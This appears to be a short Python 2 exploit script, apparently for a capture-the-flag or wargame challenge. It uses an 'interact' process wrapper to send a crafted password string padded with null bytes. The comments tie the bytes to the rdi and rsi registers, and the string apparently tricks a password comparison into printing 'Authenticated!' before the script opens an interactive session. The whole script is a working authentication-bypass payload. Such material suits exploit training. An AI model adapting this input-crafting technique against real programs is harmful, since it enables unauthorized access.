import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()

print p.readuntil('password:') # 0x40 13 58

           #rdi              #rsi
p.sendline("a" + "\x00"*30 + "\x00a\x00\x00\x00") 
print p.readuntil('Authenticated!')



# data = p.readuntil('\n')
# p.sendline('hello')

p.interactive()
